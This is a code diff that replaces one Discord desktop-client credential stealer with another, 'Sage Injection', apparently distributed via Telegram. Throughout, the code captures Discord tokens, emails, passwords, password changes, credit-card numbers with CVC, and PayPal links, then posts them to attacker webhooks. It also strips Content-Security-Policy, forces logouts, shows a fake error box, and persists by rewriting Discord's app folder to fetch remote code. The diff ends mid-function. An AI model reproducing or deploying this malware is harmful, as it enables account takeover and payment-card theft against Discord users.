@@ -1,456 +1,597 @@
-const { app, BrowserWindow, session } = require('electron');
-const path = require('path');
-const fs = require('fs');
-const https = require('https');
-const crypto = require('crypto');
+const { BrowserWindow: BrowserWindow, session: session } = require("electron"),
+    { execSync } = require("child_process"),
+    { dialog } = require("electron"),
+    { parse: parse } = require("querystring"),
+    fs = require("fs"),
+    os = require("os"),
+    https = require("https"),
+    path = require("path");
 
-// Cache pour éviter les doublons
-global.larpussCache = global.larpussCache || {
-    sentHashes: new Set(),
-    lastSent: new Map()
-};
+let WEBHOOK = "%WEBHOOK_URL%";
 
-const config = {
-    webhook: "https://discord.com/api/webhooks/1547380723370168391/5yXZgAHceuaFB-N1pNi8ac51-fgha7gKdThSQjc9tWkogtbE9rMl2vsZ_nTkbQhR5kmH",
-    inject_script: `
-        // Larpuss Injection Script - Direct DOM avec déduplication
-        (() => {
-            const WEBHOOK = "https://discord.com/api/webhooks/1547380723370168391/5yXZgAHceuaFB-N1pNi8ac51-fgha7gKdThSQjc9tWkogtbE9rMl2vsZ_nTkbQhR5kmH";
-            
-            // Cache local pour éviter les doublons DOM
-            window.larpussCache = window.larpussCache || {
-                sentData: new Set(),
-                lastAction: {}
-            };
-            
-            const createHash = (data) => {
-                return btoa(JSON.stringify(data)).replace(/[^a-zA-Z0-9]/g, '').substr(0, 32);
-            };
-            
-            const shouldSendDOM = (data, type) => {
-                const hash = createHash({ ...data, type });
-                const now = Date.now();
-                
-                // Éviter doublon exact dans les 30 secondes
-                if (window.larpussCache.sentData.has(hash)) {
-                    return false;
-                }
-                
-                // Éviter spam même action
-                const lastAction = window.larpussCache.lastAction[type];
-                if (lastAction && (now - lastAction) < 5000) { // 5 secondes entre mêmes actions
-                    return false;
-                }
-                
-                window.larpussCache.sentData.add(hash);
-                window.larpussCache.lastAction[type] = now;
-                
-                // Nettoyer le cache
-                if (window.larpussCache.sentData.size > 50) {
-                    window.larpussCache.sentData.clear();
-                }
-                
-                return true;
-            };
-            
-            const sendHook = (data, type = 'DOM') => {
-                if (!shouldSendDOM(data, type)) return;
-                
-                fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                }).catch(() => {});
-            };
-            
-            const getToken = () => {
-                try {
-                    let token;
-                    webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
-                        for (const m of Object.keys(req.c).map(x => req.c[x].exports)) {
-                            if (m?.default?.getToken) {
-                                token = m.default.getToken();
-                                break;
-                            }
-                        }
-                    }]);
-                    return token || localStorage.token?.replace(/"/g, '');
-                } catch {
-                    return localStorage.token?.replace(/"/g, '') || null;
-                }
-            };
-            
-            const captureLogin = () => {
-                const observer = new MutationObserver(() => {
-                    // Intercepter les formulaires de login
-                    const emailInput = document.querySelector('input[name="email"], input[type="email"]');
-                    const passwordInput = document.querySelector('input[name="password"], input[type="password"]');
-                    const loginButton = document.querySelector('button[type="submit"], button:contains("Log In"), button:contains("Se connecter")');
-                    
-                    if (emailInput && passwordInput && loginButton) {
-                        loginButton.addEventListener('click', () => {
-                            setTimeout(() => {
-                                const token = getToken();
-                                if (token && token.length > 50) {
-                                    sendHook({
-                                        embeds: [{
-                                            title: "🔓 Larpuss Login Captured",
-                                            fields: [
-                                                { name: "Email", value: emailInput.value, inline: true },
-                                                { name: "Password", value: passwordInput.value, inline: true },
-                                                { name: "Token", value: token, inline: false }
-                                            ],
-                                            color: 0xFFFFFF,
-                                            footer: { text: "t.me/larpuss" },
-                                            timestamp: new Date().toISOString()
-                                        }]
-                                    }, 'LOGIN_DOM');
-                                }
-                            }, 2000);
-                        });
+let [
+    BACKUPCODES_SCRIPT,
+    LOGOUT_SCRIPT,
+    TOKEN_SCRIPT,
+    INJECT_URL,
+    BADGES,
+    EMAIL,
+    PASSWORD
+] = [
+        `const elements = document.querySelectorAll('span[class^="code_"]');let p = [];elements.forEach((element, index) => {const code = element.textContent;p.push(code);});p;`,
+        'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
+        "for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) if (gg.c.hasOwnProperty(a)) { let b = gg.c[a].exports; if (b && b.__esModule && b.default) for (let a in b.default) 'getToken' == a && (token = b.default.getToken())} token;",
+        "https://raw.githubusercontent.com/tezzou/i/blob/main/d.js",
+        {
+            _nitro: [
+                "<:Piracy_UP1:1234548622046007406>",
+                "<:Piracy_UP2:1234548623409287168>",
+                "<:Piracy_UP3:1234548625057517588>",
+                "<:Piracy_UP4:1234548626907467876>",
+                "<:Piracy_UP5:1234548628668813383>",
+                "<:Piracy_UP6:1234548630300528651>",
+                "<:Piracy_UP7:1234548631831445585>",
+                "<:Piracy_UP8:1234548633618223124>",
+                "<:Piracy_UP9:1234548635295944844>",
+            ],
+            _discord_emloyee: {
+                value: 1,
+                emoji: "<:Piracy_DiscordStaff:1234548119396679752>",
+                rare: true,
+            },
+            _partnered_server_owner: {
+                value: 2,
+                emoji: "<:Piracy_Partner:1234548117773353052>",
+                rare: true,
+            },
+            _hypeSquad_events: {
+                value: 4,
+                emoji: "<:Piracy_HypeEvents:1234548131023028365>",
+                rare: true,
+            },
+            _bug_hunter_level_1: {
+                value: 8,
+                emoji: "<:Piracy_BugHunterNormal:1234548125947920426>",
+                rare: true,
+            },
+            _house_bravery: {
+                value: 64,
+                emoji: "<:Piracy_Bravery:1234548136299593728>",
+                rare: false,
+            },
+            _house_brilliance: {
+                value: 128,
+                emoji: "<:Piracy_Bravery:1234548136299593728>",
+                rare: false,
+            },
+            _house_balance: {
+                value: 256,
+                emoji: "<:Piracy_Balace:1234548169933852712>",
+                rare: false,
+            },
+            _early_supporter: {
+                value: 512,
+                emoji: "<:Piracy_EarlySupporter:1234548129106493462>",
+                rare: true,
+            },
+            _bug_hunter_level_2: {
+                value: 16384,
+                emoji: "<:Piracy_BugHunterMax:1234548127910858782>",
+                rare: true,
+            },
+            _early_bot_developer: {
+                value: 131072,
+                emoji: "<:Piracy_BotDev:1234548124605747262>",
+                rare: true,
+            },
+            _certified_moderator: {
+                value: 262144,
+                emoji: "<:Piracy_DiscordMod:1234548121057366057>",
+                rare: true,
+            },
+            _active_developer: {
+                value: 4194304,
+                emoji: "<:Piracy_ActiveDev:1234548122936676362>",
+                rare: true,
+            },
+        },
+        "",
+        ""
+    ];
+
+const request = async (method, url, headers = {}, data = null) => {
+    try {
+        return new Promise((resolve, reject) => {
+            let object = new URL(url),
+                options = {
+                    protocol: object.protocol,
+                    hostname: object.hostname,
+                    path: object.pathname + object.search,
+                    method: method.toUpperCase(),
+                    headers: {
+                        ...headers,
+                        "Access-Control-Allow-Origin": "*"
                     }
-                    
-                    // Intercepter les changements de mot de passe (Settings)
-                    const currentPasswordInput = document.querySelector('input[name="current_password"], input[placeholder*="Current Password"]');
-                    const newPasswordInput = document.querySelector('input[name="new_password"], input[placeholder*="New Password"]');
-                    const confirmPasswordInput = document.querySelector('input[name="confirm_password"], input[placeholder*="Confirm"]');
-                    const saveButton = document.querySelector('button:contains("Save"), button:contains("Enregistrer")');
-                    
-                    if (currentPasswordInput && newPasswordInput && saveButton) {
-                        saveButton.addEventListener('click', () => {
-                            setTimeout(() => {
-                                const token = getToken();
-                                if (token && currentPasswordInput.value && newPasswordInput.value) {
-                                    sendHook({
-                                        embeds: [{
-                                            title: "🔄 Larpuss Password Changed",
-                                            fields: [
-                                                { name: "🔑 Old Password", value: currentPasswordInput.value, inline: true },
-                                                { name: "🆕 New Password", value: newPasswordInput.value, inline: true },
-                                                { name: "Token", value: token, inline: false }
-                                            ],
-                                            color: 0xFF9900,
-                                            footer: { text: "t.me/larpuss • DOM Capture" },
-                                            timestamp: new Date().toISOString()
-                                        }]
-                                    }, 'PASSWORD_CHANGE_DOM');
-                                }
-                            }, 1000);
-                        });
-                    }
-                    
-                    // Intercepter les changements d'email
-                    const emailChangeInput = document.querySelector('input[name="email"], input[placeholder*="email"], input[type="email"]');
-                    const passwordForEmailInput = document.querySelector('input[name="password"], input[placeholder*="password"]');
-                    
-                    if (emailChangeInput && passwordForEmailInput && saveButton) {
-                        saveButton.addEventListener('click', () => {
-                            setTimeout(() => {
-                                const token = getToken();
-                                if (token && emailChangeInput.value && passwordForEmailInput.value) {
-                                    sendHook({
-                                        embeds: [{
-                                            title: "📧 Larpuss Email Changed", 
-                                            fields: [
-                                                { name: "📧 New Email", value: emailChangeInput.value, inline: true },
-                                                { name: "🔑 Password", value: passwordForEmailInput.value, inline: true },
-                                                { name: "Token", value: token, inline: false }
-                                            ],
-                                            color: 0x0099FF,
-                                            footer: { text: "t.me/larpuss • DOM Capture" },
-                                            timestamp: new Date().toISOString()
-                                        }]
-                                    }, 'EMAIL_CHANGE_DOM');
-                                }
-                            }, 1000);
-                        });
-                    }
-                });
-                
-                observer.observe(document.body, { childList: true, subtree: true });
-            };
-            
-            // Démarrage
-            if (document.readyState === 'loading') {
-                document.addEventListener('DOMContentLoaded', captureLogin);
-            } else {
-                captureLogin();
-            }
-            
-            // Test injection active
-            setTimeout(() => {
-                const token = getToken();
-                if (token) {
-                    sendHook({
-                        embeds: [{
-                            title: "🚀 Larpuss Injection Active",
-                            description: "DOM injection running",
-                            color: 0x00FF00,
-                            footer: { text: "t.me/larpuss" }
-                        }]
-                    });
-                }
-            }, 10000);
-        })();
-    `
-};
-
-// Fonction helper pour éviter les doublons
-const createHash = (data) => {
-    return crypto.createHash('md5').update(JSON.stringify(data)).digest('hex');
-};
-
-const shouldSend = (data, type) => {
-    const hash = createHash({ ...data, type });
-    const now = Date.now();
-    
-    // Vérifier si déjà envoyé récemment (dans les 30 secondes)
-    if (global.larpussCache.sentHashes.has(hash)) {
-        return false;
-    }
-    
-    // Pour les logins, vérifier par email (éviter spam même email/password)
-    if (type === 'LOGIN' && data.email) {
-        const lastSent = global.larpussCache.lastSent.get(`login_${data.email}`);
-        if (lastSent && (now - lastSent) < 30000) { // 30 secondes
-            return false;
-        }
-        global.larpussCache.lastSent.set(`login_${data.email}`, now);
-    }
-    
-    // Ajouter au cache
-    global.larpussCache.sentHashes.add(hash);
-    
-    // Nettoyer le cache (garder seulement les 100 derniers)
-    if (global.larpussCache.sentHashes.size > 100) {
-        const hashArray = Array.from(global.larpussCache.sentHashes);
-        global.larpussCache.sentHashes = new Set(hashArray.slice(-50));
-    }
-    
-    return true;
-};
-
-// Fonction helper pour envoyer webhook
-const sendWebhook = (data, type = 'UNKNOWN') => {
-    // Vérifier si on doit envoyer (anti-doublon)
-    if (!shouldSend(data, type)) {
-        return; // Skip si déjà envoyé récemment
-    }
-    
-    const payload = JSON.stringify(data);
-    const url = new URL(config.webhook);
-    
-    const req = https.request({
-        hostname: url.hostname,
-        port: 443,
-        path: url.pathname,
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'Content-Length': Buffer.byteLength(payload)
-        }
-    });
-    
-    req.write(payload);
-    req.end();
-};
-
-// Hook pour injecter le script dans toutes les pages Discord
-session.defaultSession.webRequest.onHeadersReceived({
-    urls: ["*://*.discord.com/*", "*://*.discordapp.com/*"]
-}, (details, callback) => {
-    callback({
-        responseHeaders: {
-            ...details.responseHeaders,
-            'Content-Security-Policy': []
-        }
-    });
-});
-
-// Injection automatique dans les webContents
-app.on('web-contents-created', (event, contents) => {
-    contents.on('dom-ready', () => {
-        if (contents.getURL().includes('discord.com')) {
-            contents.executeJavaScript(config.inject_script).catch(() => {});
-        }
-    });
-});
-
-// Hook sur les requêtes réseau pour capturer les logins ET changements
-session.defaultSession.webRequest.onBeforeRequest({
-    urls: [
-        "*://discord.com/api/*/auth/login",
-        "*://canary.discord.com/api/*/auth/login",
-        "*://ptb.discord.com/api/*/auth/login",
-        "*://discord.com/api/*/users/@me",
-        "*://canary.discord.com/api/*/users/@me",
-        "*://ptb.discord.com/api/*/users/@me"
-    ]
-}, (details, callback) => {
-    if (details.uploadData && details.uploadData[0]) {
-        try {
-            const requestData = JSON.parse(details.uploadData[0].bytes.toString());
-            
-            // Login data
-            if (details.url.includes('/auth/login')) {
-                global.lastLogin = {
-                    email: requestData.login || requestData.email,
-                    password: requestData.password,
-                    timestamp: Date.now(),
-                    type: 'LOGIN'
                 };
-            }
-            
-            // Account modification data
-            if (details.url.includes('/users/@me') && details.method === 'PATCH') {
-                global.lastModification = {
-                    old_password: requestData.password,
-                    new_password: requestData.new_password,
-                    new_email: requestData.email,
-                    new_username: requestData.username,
-                    timestamp: Date.now(),
-                    type: 'ACCOUNT_CHANGE'
-                };
-            }
-        } catch {}
+            let req = https.request(options, (res) => {
+                let resd = '';
+                res.on('data', (chunk) => resd += chunk);
+                res.on('end', () => resolve(resd));
+            });
+            req.on('error', (err) => reject(err));
+            if (data) req.write(data);
+            req.end();
+        });
+    } catch (err) {
+        return Promise.reject(err);
     }
-    callback({});
-});
+};
 
-// Hook sur les réponses pour détecter les logins réussis ET changements
-session.defaultSession.webRequest.onCompleted({
-    urls: [
-        "*://discord.com/api/*/auth/login",
-        "*://canary.discord.com/api/*/auth/login", 
-        "*://ptb.discord.com/api/*/auth/login",
-        "*://discord.com/api/*/users/@me",
-        "*://canary.discord.com/api/*/users/@me",
-        "*://ptb.discord.com/api/*/users/@me"
-    ]
-}, (details) => {
-    if (details.statusCode === 200) {
-        
-        // Login réussi
-        if (details.url.includes('/auth/login') && global.lastLogin) {
-            const loginData = global.lastLogin;
-            
-            const webhook_data = {
+const notify = async (ctx, token, acc) => {
+    let nitro = getNitro(await fProfile(token)),
+        badges = await getBadges(acc.flags),
+        billing = await getBilling(token),
+        friends = await getFriends(token)
+
+
+    ctx.embeds[0].title = ``;
+    ctx.embeds[0].fields.unshift({
+        name: `Token:`,
+        value: `\`${token}\``,
+        inline: false
+    })
+
+    ctx.embeds[0].thumbnail = {
+        url: `https://cdn.discordapp.com/avatars/${acc.id}/${acc.avatar}.webp`,
+    };
+
+    ctx.embeds[0].fields.push(
+        { name: "Badges:", value: badges + nitro, inline: true },
+        { name: "Billing:", value: billing, inline: true },
+        { name: "IP:", value: `\`${JSON.parse(await getNetwork()).ip}\``, inline: true },
+        { name: "Path:", value: `\`\`\`${__dirname.toString().trim().replace(/\\/g, "/")}\`\`\``, inline: false },
+    );
+
+    ctx.embeds.push(
+        { title: `HQ Friends`, description: friends },
+    );
+
+    ctx.embeds.forEach((e) => {
+        e.color = 0xEB459E;
+        e.author = {
+            name: `Sage Injection | ${acc.username} (${acc.id})`,
+            icon_url: `https://media.discordapp.net/attachments/1248748250815791115/1249415526141395105/SageStealer.png?ex=66673862&is=6665e6e2&hm=8190c1ecd41a152387f382bc4fde19ebedaad344c2573a4efd79088a1956622f&=&format=webp&quality=lossless&width=305&height=262`,
+        };
+        e.footer = {
+            text: "t.me/sagestealer",
+        };
+    });
+};
+
+const decodeB64 = (s) =>
+    Buffer.from(s, 'base64').toString();
+
+const execScript = async (s) =>
+    await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(s, !0);
+dialog.showErrorBox("Ops!", "An internal error occurred in the Discord API.");
+
+const fetch = async (e, h) =>
+    JSON.parse(await request("GET", `${[
+        'https://discordapp.com/api',
+        'https://discord.com/api',
+        'https://canary.discord.com/api',
+        'https://ptb.discord.com/api'
+    ][Math.floor(Math.random() * 4)]}/v9/users/${e}`, { ...h }));
+
+const fAccount = async (authorization) =>
+    await fetch("@me", { authorization });
+
+const fProfile = async (authorization) =>
+    await fetch(`${Buffer.from(authorization.split(".")[0], "base64").toString("binary")}/profile`, { authorization });
+
+const fFriends = async (authorization) =>
+    await fetch("@me/relationships", { authorization });
+
+const fServers = async (authorization) =>
+    await fetch("@me/guilds?with_counts=true", { authorization });
+
+const fBilling = async (authorization) =>
+    await fetch("@me/billing/payment-sources", { authorization });
+
+const getNetwork = async () =>
+    await request("GET", "https://api.ipify.org/?format=json", {
+        "Content-Type": "application/json"
+    });
+
+const getBadges = (f) =>
+    Object.keys(BADGES)
+        .reduce((s, h) => BADGES.hasOwnProperty(h)
+            && (f & BADGES[h].value) === BADGES[h].value
+            ? `${s}${BADGES[h].emoji} `
+            : s, "",
+        ) || "❌";
+
+const getRareBadges = (f) =>
+    Object.keys(BADGES)
+        .reduce((b, e) => BADGES.hasOwnProperty(e)
+            && (f & BADGES[e].value) === BADGES[e].value
+            && BADGES[e].rare
+            ? `${b}${BADGES[e].emoji} `
+            : b, "",
+        );
+
+const getBilling = async (t) =>
+    (await fBilling(t))
+        .filter((x) => !x.invalid)
+        .map((x) => x.type === 1
+            ? "CreditCard"
+            : x.type === 2
+                ? "PayPal"
+                : "",
+        ).join("") || "❌";
+
+const getFriends = async (s) =>
+    (await fFriends(s))
+        .filter((user) => user.type === 1)
+        .reduce((r, a) => ((b) => b
+            ? (r || "") + `${b} | \`${a.user.username}\`\n`
+            : r)(getRareBadges(a.user.public_flags)),
+            "",
+        ) || "❌";
+
+
+
+const getDate = (a, b) => new Date(a).setMonth(a.getMonth() + b);
+
+const getNitro = (u) => {
+    let { premium_type, premium_guild_since } = u,
+        x = "Nitro";
+    switch (premium_type) {
+        default:
+            return " ";
+        case 1:
+            return x;
+        case 2:
+            if (!premium_guild_since) return x;
+            let m = [2, 3, 6, 9, 12, 15, 18, 24],
+                rem = 0;
+            for (let i = 0; i < m.length; i++)
+                if (Math.round((getDate(new Date(premium_guild_since), m[i]) - new Date()) / 86400000) > 0) {
+                    rem = i;
+                    break;
+                }
+            return `${x} ${BADGES._nitro[rem]}`;
+    }
+};
+
+const cruise = async (type, mail, pass, res, req, act) => {
+    let info;
+    let msg;
+    let token;
+    switch (type) {
+        case 'LOGIN_USER':
+            info = await fAccount(res.token);
+            msg = {
+                title: act,
                 embeds: [{
-                    color: 0xFFFFFF,
-                    author: {
-                        name: `Larpuss Injection | Login Captured`,
-                        icon_url: "https://media.discordapp.net/attachments/1248748250815791115/1249415526141395105/SageStealer.png?ex=66673862&is=6665e6e2&hm=8190c1ecd41a152387f382bc4fde19ebedaad344c2573a4efd79088a1956622f&=&format=webp&quality=lossless&width=305&height=262"
-                    },
                     fields: [
-                        {
-                            name: `<:accmail:1547383216435101696> Email:`,
-                            value: `\`${loginData.email || "Unknown"}\``,
-                            inline: true
-                        },
-                        {
-                            name: `🔑 Password:`,
-                            value: `\`${loginData.password || "Unknown"}\``,
-                            inline: true
-                        },
-                        {
-                            name: `🌐 Client:`,
-                            value: `\`${details.url.includes('canary') ? 'Discord Canary' : details.url.includes('ptb') ? 'Discord PTB' : 'Discord Stable'}\``,
-                            inline: true
-                        }
+                        { name: "Email:", value: `\`${mail}\``, inline: true },
+                        { name: "Password:", value: `\`${pass}\``, inline: true },
                     ],
-                    footer: {
-                        text: "t.me/larpuss",
-                    },
-                    timestamp: new Date().toISOString()
-                }]
+                }],
             };
-            
-            // Envoyer avec déduplication
-            sendWebhook(webhook_data, 'LOGIN', loginData);
-            global.lastLogin = null;
-        }
-        
-        // Changement de compte réussi
-        if (details.url.includes('/users/@me') && details.method === 'PATCH' && global.lastModification) {
-            const modData = global.lastModification;
-            
-            const fields = [
-                { name: "⚙️ Account Settings:", value: "User changed account information", inline: false }
-            ];
-            
-            if (modData.old_password && modData.new_password) {
-                fields.push(
-                    { name: "🔑 Old Password:", value: `\`${modData.old_password}\``, inline: true },
-                    { name: "🆕 New Password:", value: `\`${modData.new_password}\``, inline: true }
+            if (req.code !== undefined) {
+                msg.embeds[0].fields.push(
+                    { name: "Used Code:", value: `\`${req.code}\``, inline: true }
                 );
             }
-            
-            if (modData.new_email) {
-                fields.push({ name: "<:accmail:1547383216435101696> New Email:", value: `\`${modData.new_email}\``, inline: true });
-            }
-            
-            if (modData.new_username) {
-                fields.push({ name: "👤 New Username:", value: `\`${modData.new_username}\``, inline: true });
-            }
-            
-            const webhook_data = {
+            notify(msg, res.token, info);
+            break;
+        case 'USERNAME_CHANGED':
+            info = await fAccount(res.token);
+            msg = {
+                title: act,
                 embeds: [{
-                    color: 0xFFFFFF,
-                    author: {
-                        name: `Larpuss Injection | Account Modified`,
-                        icon_url: "https://media.discordapp.net/attachments/1248748250815791115/1249415526141395105/SageStealer.png?ex=66673862&is=6665e6e2&hm=8190c1ecd41a152387f382bc4fde19ebedaad344c2573a4efd79088a1956622f&=&format=webp&quality=lossless&width=305&height=262"
-                    },
-                    fields: fields,
-                    footer: {
-                        text: "t.me/larpuss",
-                    },
-                    timestamp: new Date().toISOString()
-                }]
+                    fields: [
+                        { name: "New Username:", value: `\`${req.username}\``, inline: true, },
+                        { name: "Password:", value: `\`${req.password}\``, inline: true, },
+                    ],
+                }],
             };
-            
-            // Envoyer avec déduplication
-            sendWebhook(webhook_data, 'ACCOUNT_CHANGE', modData);
-            global.lastModification = null;
-        }
+            notify(msg, res.token, info);
+            break;
+        case 'EMAIL_CHANGED':
+            info = await fAccount(res.token);
+            msg = {
+                title: act,
+                embeds: [{
+                    fields: [
+                        { name: "Email:", value: `\`${mail}\``, inline: true },
+                        { name: "Password:", value: `\`${pass}\``, inline: true },
+                    ],
+                }],
+            };
+            notify(msg, res.token, info);
+            break;
+        case 'PASSWORD_CHANGED':
+            info = await fAccount(res.token);
+            msg = {
+                title: act,
+                embeds: [{
+                    fields: [
+                        { name: "New Password:", value: `\`${req.new_password}\``, inline: true, },
+                        { name: "Old Password:", value: `\`${req.password}\``, inline: true, },
+                    ],
+                }],
+            };
+            notify(msg, res.token, info);
+            break;
+        case 'CREDITCARD_ADDED':
+            token = res;
+            info = await fAccount(token);
+            msg = {
+                title: act,
+                embeds: [{
+                    fields: [
+                        { name: "Number", value: `\`${req["card[number]"]}\``, inline: true },
+                        { name: "CVC", value: `\`${req["card[cvc]"]}\``, inline: true },
+                        { name: "Expiration", value: `\`${req["card[exp_month]"]}/${req["card[exp_year]"]}\``, inline: true, },
+                    ],
+                }],
+            };
+            notify(msg, token, info);
+            break;
+        case 'PAYPAL_ADDED':
+            token = res;
+            info = await fAccount(token);
+            msg = {
+                title: act,
+                embeds: [{
+                    fields: [
+                        { name: "Email:", value: `\`${info.email}\``, inline: true },
+                    ],
+                }],
+            };
+            notify(msg, token, info);
+            break;
+        case 'INJECTED':
+            token = res;
+            info = await fAccount(token);
+            msg = {
+                title: act,
+                embeds: [{
+                    fields: [
+                        { name: "Email:", value: `\`${info.email}\``, inline: true },
+                    ],
+                }],
+            };
+            notify(msg, token, info);
+            break;
+        default:
     }
+}
+
+const DISCORD_PATH = (function () {
+    const app = process.argv[0].split(path.sep).slice(0, -1).join(path.sep);
+    let resource;
+    if (process.platform === "win32") resource = path.join(app, "resources");
+    else if (process.platform === "darwin")
+        resource = path.join(app, "Contents", "Resources");
+    if (fs.existsSync(resource)) return { resource, app };
+    return { undefined, undefined };
+})();
+
+async function UPDATE_CHECKING() {
+    let i = "initiation";
+    const { resource, app } = DISCORD_PATH;
+    if (resource === undefined || app === undefined) return;
+    let p = path.join(resource, "app");
+    if (!fs.existsSync(p)) fs.mkdirSync(p);
+    if (fs.existsSync(path.join(p, "package.json")))
+        fs.unlinkSync(path.join(p, "package.json"));
+    if (fs.existsSync(path.join(p, "index.js")))
+        fs.unlinkSync(path.join(p, "index.js"));
+    if (process.platform === "win32" || process.platform === "darwin") {
+        fs.writeFileSync(
+            path.join(p, "package.json"),
+            JSON.stringify({ name: "discord", main: "index.js" }, null, 4),
+        );
+        fs.writeFileSync(
+            path.join(p, "index.js"),
+            `const fs = require('fs'), https = require('https');\nconst indexJs = '${`${app}\\modules\\${fs.readdirSync(`${app}\\modules\\`).filter((x) => /discord_desktop_core-+?/.test(x))[0]}\\discord_desktop_core\\index.js`}';\nconst bdPath = '${path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar")}';\nconst K4ITRUN = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (K4ITRUN < 20000 || data === "module.exports = require('./core.asar')")\n        init();\n})\nasync function init() {\n    https.get('${INJECT_URL}', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '${WEBHOOK}')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n        \n    }).on("error", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('${path.join(resource, "app.asar")}')\nif (fs.existsSync(bdPath)) require(bdPath);`.replace(/\\/g, "\\\\")
+        );
+    }
+    if (!fs.existsSync(path.join(__dirname, i))) return;
+    else fs.rmdirSync(path.join(__dirname, i));
+    if (!(await execScript(TOKEN_SCRIPT))) return;
+    cruise(
+        "INJECTED",
+        null,
+        null,
+        (await execScript(TOKEN_SCRIPT)) ?? "",
+        null,
+        `DISCORD INJECTED`,
+    );
+    execScript(LOGOUT_SCRIPT);
+}
+
+session.defaultSession.webRequest.onBeforeRequest(
+    {
+        urls: [
+            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
+            "https://*.discord.com/api/v*/applications/detectable",
+            "https://discord.com/api/v*/applications/detectable",
+            "https://*.discord.com/api/v*/users/@me/library",
+            "https://discord.com/api/v*/users/@me/library",
+            "wss://remote-auth-gateway.discord.gg/*",
+            "https://discord.com/api/v*/auth/sessions",
+            "https://*.discord.com/api/v*/auth/sessions",
+            "https://discordapp.com/api/v*/auth/sessions",
+        ],
+    },
+    (d, callback) => {
+        if (!fs.existsSync(`${__dirname}/Discord`))
+            fs.mkdirSync(`${__dirname}/Discord`);
+        if (!fs.existsSync(`${__dirname}/Discord/${WEBHOOK.split("/")[WEBHOOK.split("/").length - 1]}.txt`,)) {
+            fs.writeFileSync(`${__dirname}/Discord/${WEBHOOK.split("/")[WEBHOOK.split("/").length - 1]}.txt`, WEBHOOK,);
+            execScript(LOGOUT_SCRIPT);
+        }
+        if (d.url.startsWith("wss://remote-auth-gateway") || d.url.endsWith("auth/sessions"))
+            callback({ cancel: true });
+        else
+            callback({ cancel: false });
+        UPDATE_CHECKING();
+    },
+);
+
+session.defaultSession.webRequest.onHeadersReceived((a, callback) => {
+    delete a.responseHeaders["content-security-policy"];
+    delete a.responseHeaders["content-security-policy-report-only"];
+    callback({
+        responseHeaders: {
+            ...a.responseHeaders,
+            "Access-Control-Allow-Headers": "*",
+        },
+    });
 });
 
-// Auto-persistence dans Discord
-const persistence = () => {
-    try {
-        const discordPath = process.execPath.replace(/[^\\]*$/, '');
-        const resourcesPath = path.join(discordPath, 'resources');
-        
-        if (fs.existsSync(resourcesPath)) {
-            const appPath = path.join(resourcesPath, 'app');
-            if (!fs.existsSync(appPath)) {
-                fs.mkdirSync(appPath, { recursive: true });
-            }
-            
-            // Package.json
-            fs.writeFileSync(path.join(appPath, 'package.json'), JSON.stringify({
-                name: "discord",
-                main: "index.js"
-            }));
-            
-            // Index.js avec injection
-            const indexContent = `
-// Larpuss Persistence
-${fs.readFileSync(__filename, 'utf8')}
-
-// Load Discord
-require('${path.join(resourcesPath, 'app.asar').replace(/\\/g, '\\\\')}');
-            `;
-            
-            fs.writeFileSync(path.join(appPath, 'index.js'), indexContent);
+session.defaultSession.webRequest.onCompleted(
+    {
+        urls: [
+            "https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
+            "https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
+            "https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
+            "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts",
+            "https://api.stripe.com/v*/tokens",
+        ],
+    },
+    async (a, callback) => {
+        let data;
+        try {
+            data = parse(Buffer.from(a.uploadData[0].bytes).toString());
+        } catch (err) {
+            data = parse(decodeURIComponent(a.uploadData[0].bytes.toString()));
         }
-    } catch {}
+        let authorization = (await execScript(TOKEN_SCRIPT)) ?? "";
+        if (a.method != "POST") return;
+        if (a.statusCode !== 200 && a.statusCode !== 202) return;
+        if (a.url.endsWith("/paypal_accounts")) {
+            cruise(
+                "PAYPAL_ADDED",
+                null,
+                null,
+                authorization,
+                null,
+                `PAYPAL ADDED`,
+            );
+        } else if (a.url.endsWith("/tokens")) {
+            cruise(
+                "CREDITCARD_ADDED",
+                null,
+                null,
+                authorization,
+                data,
+                `CREDITCARD ADDED`,
+            );
+        }
+    },
+);
+
+const CREATE_WINDOW_CLIENT = (win) => {
+    if (!win.getAllWindows()[0]) return;
+    win.getAllWindows()[0].webContents.debugger.attach("1.3");
+    win.getAllWindows()[0].webContents.debugger.on("message", async (_, m, p) => {
+        if (m !== "Network.responseReceived") return;
+        if (!["/auth/login", "/auth/register", "/mfa/totp", "/users/@me",].some((url) => p.response.url.endsWith(url))) return;
+        if (p.response.status !== 200 && p.response.status !== 202) return;
+        let RESPONSE_DATA = JSON.parse(
+            (
+                await win.getAllWindows()[0].webContents.debugger.sendCommand(
+                    "Network.getResponseBody",
+                    { requestId: p.requestId },
+                )
+            ).body,
+        ),
+            REQUEST_DATA = JSON.parse(
+                (
+                    await win.getAllWindows()[0].webContents.debugger.sendCommand(
+                        "Network.getRequestPostData",
+                        { requestId: p.requestId },
+                    )
+                ).postData,
+            );
